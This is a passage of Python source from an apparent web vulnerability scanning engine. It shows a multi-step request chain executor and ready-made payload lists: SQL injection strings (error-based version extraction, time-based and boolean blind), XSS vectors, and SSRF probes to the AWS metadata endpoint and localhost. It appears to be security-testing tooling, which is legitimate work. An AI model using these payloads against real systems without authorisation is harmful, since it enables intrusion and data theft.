                ChainStep(
                    label="Get login form",
                    request=MutationRequest(url="http://target.com/login"),
                    extractors=[
                        ResponseExtractor(
                            name="csrf_token",
                            source="body",
                            pattern=r'<input.*name="csrf".*value="([^"]*)"'
                        )
                    ]
                ),
                ChainStep(
                    label="Submit login",
                    request=MutationRequest(
                        url="http://target.com/login",
                        method=HttpMethod.POST,
                        body={"username": "admin", "password": "pass", "csrf": "{csrf_token}"}
                    )
                ),
            ]
            
            result = await engine.execute_chain("login_bypass", steps)
        
        Args:
            chain_id: Identifier for this chain (for logging/tracing)
            steps: List of ChainStep objects
            initial_values: Optional initial extracted values (e.g., session ID)
        
        Returns:
            ChainResult with evidence, extracted values, and outcome
        """
        start = time.monotonic()
        extracted: Dict[str, str] = dict(initial_values or {})
        responses: List[MutationResponse] = []
        all_evidence: List[Evidence] = []
        steps_completed = 0
        error: Optional[str] = None
        
        for i, step in enumerate(steps):
            # Delay if specified
            if step.delay_ms > 0:
                await asyncio.sleep(step.delay_ms / 1000)
            
            # Interpolate extracted values into the request
            request = self._interpolate_request(step.request, extracted)
            
            # Send
            response = await self.send(request)
            responses.append(response)
            
            # Check for failure
            if response.status_code == 0 and not step.continue_on_fail:
                error = f"Step {i+1} '{step.label}' failed: transport error"
                break
            
            steps_completed += 1
            
            # Run extractors
            for extractor in step.extractors:
                result = extractor.extract(response)
                if result:
                    extracted[result.name] = result.value
            
            # Collect evidence from the step's payload oracles (if payload attached)
            if step.request.payload:
                baseline = await self.get_baseline(step.request.url)
                
                for oracle_fn in [detect_sql_errors, detect_reflection]:
                    evidence = oracle_fn(response, step.request.payload)
                    all_evidence.extend(evidence)
                
                all_evidence.extend(
                    detect_time_anomaly(response, baseline.elapsed_ms, step.request.payload)
                )
                all_evidence.extend(
                    detect_status_diff(response, baseline.status_code, step.request.payload)
                )
        
        elapsed = (time.monotonic() - start) * 1000
        
        # Determine overall outcome
        if error:
            outcome = ActionOutcome.ERROR
        elif any(e.confidence >= 0.8 for e in all_evidence):
            outcome = ActionOutcome.SUCCESS
        elif any(e.confidence >= 0.5 for e in all_evidence):
            outcome = ActionOutcome.PARTIAL
        elif steps_completed == len(steps):
            outcome = ActionOutcome.FAILURE  # Completed but no evidence
        else:
            outcome = ActionOutcome.ERROR
        
        return ChainResult(
            chain_id=chain_id,
            steps_completed=steps_completed,
            steps_total=len(steps),
            success=outcome == ActionOutcome.SUCCESS,
            evidence=all_evidence,
            responses=responses,
            extracted_values=extracted,
            elapsed_ms=elapsed,
            outcome=outcome,
            error=error,
        )
    
    def _interpolate_request(
        self,
        request: MutationRequest,
        values: Dict[str, str],
    ) -> MutationRequest:
        """Replace {variable_name} placeholders in request with extracted values.
        
        Supports interpolation in:
        - URL path and query
        - Headers
        - Cookies
        - Body (string and dict)
        
        Args:
            request: MutationRequest with placeholders
            values: Dict of variable_name → extracted_value
        
        Returns:
            New MutationRequest with placeholders replaced
        """
        def _sub(text: str) -> str:
            for name, value in values.items():
                text = text.replace(f"{{{name}}}", value)
            return text
        
        new_headers = {k: _sub(v) for k, v in request.headers.items()}
        new_cookies = {k: _sub(v) for k, v in request.cookies.items()}
        new_params = {k: _sub(v) for k, v in request.query_params.items()}
        
        new_body = request.body
        if isinstance(new_body, str):
            new_body = _sub(new_body)
        elif isinstance(new_body, dict):
            new_body = {k: _sub(str(v)) if isinstance(v, str) else v for k, v in new_body.items()}
        
        return MutationRequest(
            url=_sub(request.url),
            method=request.method,
            headers=new_headers,
            cookies=new_cookies,
            query_params=new_params,
            body=new_body,
            content_type=request.content_type,
            timeout=request.timeout,
            payload=request.payload,
            step_label=request.step_label,
        )


# ---------------------------------------------------------------------------
# Convenience: Pre-built Payload Libraries
# ---------------------------------------------------------------------------

def sqli_payloads(param_name: str = "id") -> List[MutationPayload]:
    """Standard SQL injection test payloads.
    
    Includes error-based, time-based blind, and boolean-based blind variants
    for MySQL, MSSQL, PostgreSQL.
    
    Args:
        param_name: Parameter name for injection (default "id")
    
    Returns:
        List of MutationPayload objects
    """
    return [
        # Error-based
        MutationPayload(
            value="' OR '1'='1", param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="sqli", description="Basic OR true",
            expected_evidence=EvidenceType.ERROR_SIGNATURE, tier_required=2,
        ),
        MutationPayload(
            value="1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="sqli", description="MySQL error-based version extraction",
            expected_evidence=EvidenceType.DATA_EXTRACTION, tier_required=3,
        ),
        # Time-based blind
        MutationPayload(
            value="1' AND SLEEP(5)--",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="sqli", description="MySQL time-based blind (5s delay)",
            expected_evidence=EvidenceType.TIME_ANOMALY, tier_required=2,
        ),
        MutationPayload(
            value="1'; WAITFOR DELAY '0:0:5'--",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="sqli", description="MSSQL time-based blind (5s delay)",
            expected_evidence=EvidenceType.TIME_ANOMALY, tier_required=2,
        ),
        # Boolean-based blind
        MutationPayload(
            value="1' AND 1=1--",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="sqli", description="Boolean blind (true condition)",
            expected_evidence=EvidenceType.CONTENT_DIFF, tier_required=2,
        ),
        MutationPayload(
            value="1' AND 1=2--",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="sqli", description="Boolean blind (false condition)",
            expected_evidence=EvidenceType.CONTENT_DIFF, tier_required=2,
        ),
    ]


def xss_payloads(param_name: str = "q") -> List[MutationPayload]:
    """Standard XSS test payloads.
    
    Includes reflected XSS vectors: script injection, attribute breakout,
    JS protocol, SVG events.
    
    Args:
        param_name: Parameter name for injection (default "q")
    
    Returns:
        List of MutationPayload objects
    """
    return [
        MutationPayload(
            value='<script>alert(1)</script>',
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="xss", description="Basic script injection",
            expected_evidence=EvidenceType.REFLECTION, tier_required=2,
        ),
        MutationPayload(
            value='"><img src=x onerror=alert(1)>',
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="xss", description="Attribute breakout with img/onerror",
            expected_evidence=EvidenceType.REFLECTION, tier_required=2,
        ),
        MutationPayload(
            value="javascript:alert(1)",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="xss", description="JS protocol injection",
            expected_evidence=EvidenceType.REFLECTION, tier_required=2,
        ),
        MutationPayload(
            value='<svg onload=alert(1)>',
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="xss", description="SVG onload event handler",
            expected_evidence=EvidenceType.REFLECTION, tier_required=2,
        ),
    ]


def ssrf_payloads(param_name: str = "url") -> List[MutationPayload]:
    """Standard SSRF test payloads.
    
    Includes AWS metadata endpoint, localhost probe, and cloud metadata variants.
    
    Args:
        param_name: Parameter name for injection (default "url")
    
    Returns:
        List of MutationPayload objects
    """
    return [
        MutationPayload(
            value="http://169.254.169.254/latest/meta-data/",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="ssrf", description="AWS metadata endpoint",
            expected_evidence=EvidenceType.DATA_EXTRACTION, tier_required=3,
        ),
        MutationPayload(
            value="http://127.0.0.1:80/",
            param_name=param_name,
            encoding=PayloadEncoding.QUERY_PARAM,
            vuln_class="ssrf", description="Localhost probe",
            expected_evidence=EvidenceType.CONTENT_DIFF, tier_required=2,
        ),
    ]
